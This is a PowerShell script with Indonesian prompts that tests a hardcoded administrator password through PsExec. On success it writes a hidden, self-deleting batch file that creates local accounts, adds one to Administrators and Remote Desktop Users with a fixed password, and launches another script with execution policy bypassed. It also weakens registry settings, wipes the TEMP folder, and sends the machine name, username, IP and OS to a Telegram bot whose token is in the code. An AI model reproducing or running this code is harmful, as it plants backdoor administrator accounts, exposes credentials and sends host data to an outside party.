
$ErrorActionPreference = 'SilentlyContinue'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Windows.Controls
Add-Type -AssemblyName System.Windows.Media
Add-Type -AssemblyName System.Windows.Navigation
Add-Type -AssemblyName System.Windows.Shared
Add-Type -AssemblyName System.Windows.Window
Add-Type -AssemblyName System.Windows.Input
Add-Type -AssemblyName System.Windows.Mouse
Add-Type -AssemblyName System.Windows.Menu
Add-Type -AssemblyName System.Windows.Misc
Add-Type -AssemblyName System.Windows.Network
Add-Type -AssemblyName System.Windows.Process
Add-Type -AssemblyName System.Windows.Routing
Add-Type -AssemblyName System.Windows.Security
Add-Type -AssemblyName System.Windows.Storage
Add-Type -AssemblyName System.Windows.Text
Add-Type -AssemblyName System.Windows.Web
Add-Type -AssemblyName System.Windows.WebControls
Add-Type -AssemblyName System.Windows.UI
Add-Type -AssemblyName System.Windows.UIControls
Add-Type -AssemblyName Microsoft.VisualBasic

Remove-Item -Path "$env:TEMP\*" -Recurse -Force

$folderPath_4869 = "C:\Users\$env:USERNAME\AppData\roaming\4869"

Clear-Host

$OS = (Get-ComputerInfo).WindowsProductName
$Compname = (Get-WmiObject Win32_Computersystem).name

$Ip4 = Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress
$Octet_1 = $ip4.Split('.')[-4]
$Octet_2 = $ip4.Split('.')[-3]
$Octet_3 = $ip4.Split('.')[-2]
$Octet_4 = $ip4.Split('.')[-1]
$octet = "$octet_1.$octet_2.$octet_3"
cd HKCU:
New-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main" -Name "Start Page" -Value $main -Type String -Force
New-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Privacy" -Name "ClearBrowsingHistoryOnExit" -Value 1 -Type DWord -Force
    
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Office\15.0\Common\Identity" -Name EnableADAL -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Office\15.0\Common\Identity" -Name Version -Value 1 -PropertyType DWORD -Force
Set-ItemProperty -Path 'HKCU:\Control Panel\International' -Name sList -Value ','
    
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -Value 2 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 2 -Type DWord
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\New Windows" -Name "PopupMgr" -Value 0 -Type DWord
Set-ItemProperty -Path "HKCU:\SOFTWARE\Sysinternals\PsExec" -Name "EulaAccepted" -Value 1 -Type DWord

New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -Value 2 -Type DWORD -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 2 -Type DWORD -Force
New-Item -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\New Windows" -Force
New-Item -Path "HKCU:\SOFTWARE\Sysinternals\PsExec" -Name "EulaAccepted" -Value 1 -PropertyType DWORD -Force
Set-ItemProperty -Path "HKCU:\SOFTWARE\Sysinternals\PsExec" -Name "EulaAccepted" -Value 1 -Type DWORD -Force
cd c:
Clear-Host
Write-Host "Mohon tunggu, sedang pengecekan user password credential"
$psExecPath = "C:\Runas\psexec.exe"
$credentials = @(
    # List of credentials in the format: username,password
    "mdsadm,mds901",

)
    
# Arrays to store successful and unsuccessful credentials
$successfulCredentials = @()
$unsuccessfulCredentials = @()
    
foreach ($cred in $credentials) {
    $splitCred = $cred -split ','
    $user = $splitCred[0]
    $pass = $splitCred[1]
    
    # Create a secure string for the password
    $securePassword = ConvertTo-SecureString $pass -AsPlainText -Force
    
    # Create a PSCredential object using the username and secure password
    $credential = New-Object System.Management.Automation.PSCredential ($user, $securePassword)
    
    # Start the process using the specified credentials
    $process = Start-Process -FilePath $psExecPath -ArgumentList "-u", $user, "-p", $pass, "net", "user" -Wait -PassThru
    
    # Get the ExitCode of the process
    $exitCode = $process.ExitCode
    
    # Check the ExitCode to determine the result and store the credential accordingly
    if ($exitCode -eq 0) {
        $successfulCredentials += $cred
        
    }
    else {
        $unsuccessfulCredentials += $cred
    }
}

if ($successfulCredentials.Count -gt 0) {

    foreach ($cred in $successfulCredentials) {
        $splitCred = $cred -split ','
        $user = $splitCred[0]
        $pass = $splitCred[1]
    
        Remove-Item -Path "C:\Users\$env:USERNAME\AppData\roaming\4869\JacktheRipper.bat" -Recurse -Force
        # Define the content of the batch file using a here-string
        $batchContent = @"
                    @echo off
                    cls
                    setlocal enabledelayedexpansion
                    net user MDSLUSER Matahari123 /add
                    net localgroup "remote desktop users" MDSLUSER /ADD
                    net accounts maxpwage:unlimited
                    net user MDSLADMIN S3cr3tP@ssw0rd /add
                    net user MDSLADMIN S3cr3tP@ssw0rd 
                    net localgroup "administrators" MDSLADMIN /ADD 
                    net accounts maxpwage:unlimited
                    start powershell.exe -executionpolicy bypass -noprofile -file "$folderPath_4869\ProgramGUI_v2.ps1"
                    net accounts maxpwage:unlimited
                    del /s /q /f %~dp0JacktheRipper.bat
                    exit
"@

        # Replace '%loc%' with the desired path where you want to save the file
        $batchFilePath = "C:\Users\$env:USERNAME\AppData\roaming\4869\JacktheRipper.bat"

        # Save the content to the file
        $batchContent | Set-Content -Path $batchFilePath

        $fileAttributes = (Get-Item "C:\Users\$env:USERNAME\AppData\roaming\4869\JacktheRipper.bat").Attributes
        $fileAttributes += [System.IO.FileAttributes]::Hidden
        Set-ItemProperty -Path "C:\Users\$env:USERNAME\AppData\roaming\4869\JacktheRipper.bat" -Name Attributes -Value $fileAttributes
 
        # Path to psexec.exe and elevate.exe
        $psexecPath = "c:\runas\psexec.exe"
        $elevatePath = "c:\runas\elevate.exe"

        # Run the command
        & $psexecPath -accepteula -nobanner -u $user -p $pass $elevatePath cmd /c $batchFilePath
        clear-host 
        Function Send-Telegram {
            Param([Parameter(Mandatory = $true)][String]$Message)
            $Telegramtoken = "6051543874:AAHCrc8FLOOiwn08yuh9b-5VfbJ6syS40CI"
            $Telegramchatid = "5639003528"
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            $Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($Telegramtoken)/sendMessage?chat_id=$($Telegramchatid)&text=$($Message)" 
            Write-output $Response 
        }
        Clear-Host

        Send-Telegram -Message "Running ProgramGUIv3 $Compname $env:Username $Ip4 $OS"
        
        exit   
    }
}
else {
    # Message to display in the message box
    $message = "Maaf, User Password administrator tidak cocok !"
                    
    # Title of the message box
    $title = "Failure User Pass Admin"
                 
    # Show the message box with OK button and exclamation mark icon
    [System.Windows.Forms.MessageBox]::Show($message, $title, [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Exclamation)
                 
    # Exit the script
    exit
}











